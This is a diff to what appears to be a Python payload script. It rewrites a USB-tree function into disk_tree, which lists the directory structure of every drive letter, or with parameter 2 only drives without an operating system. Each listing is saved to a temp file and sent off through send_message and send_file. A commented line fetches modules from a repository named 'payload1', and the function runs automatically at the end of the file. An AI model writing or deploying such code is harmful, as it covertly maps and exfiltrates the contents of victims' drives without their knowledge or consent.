@@ -106,19 +106,34 @@ def tree(directory, file, prefix=''):
             connector = '├── ' if index < len(contents) - 1 else '└── '
             file.write(prefix + connector + name + '\n')
 
-def tree_usb():
+def disk_tree(parameter):
     maj_letters = list(string.ascii_uppercase)
     for maj_letters in maj_letters:
         letterpath = str(maj_letters) + ":\\"
         if os.path.isdir(letterpath):
-            with tempfile.NamedTemporaryFile(delete=False, mode='w', encoding='utf-8') as temp_file:
-                tree(letterpath, temp_file)
-                temp_file_path = temp_file.name
-            print(f"{letterpath} : {temp_file_path}")
-            send_message(letterpath)
-            send_file(temp_file_path)
+            if parameter == 1:
+                with tempfile.NamedTemporaryFile(delete=False, mode='w', encoding='utf-8') as temp_file:
+                    tree(letterpath, temp_file)
+                    temp_file_path = temp_file.name
+                print(f"{letterpath} : {temp_file_path}")
+                send_message(letterpath)
+                send_file(temp_file_path)
+            if parameter == 2:
+                if os.path.isdir(letterpath + "Windows\\system32"):
+                    pass
+                elif os.path.isdir("/usr/bin"):
+                    pass
+                else:
+                    with tempfile.NamedTemporaryFile(delete=False, mode='w', encoding='utf-8') as temp_file:
+                        tree(letterpath, temp_file)
+                        temp_file_path = temp_file.name
+                    print(f"{letterpath} : {temp_file_path}")
+                    send_message(letterpath)
+                    send_file(temp_file_path)
 
 #Install modules :
 #download_and_install_whls('https://api.github.com/repos/slayy2357/payload1/contents/modules')
 
-tree_usb()
+#Param 1 : for all disks
+#Param 2 : for no OS disks
+disk_tree(2)
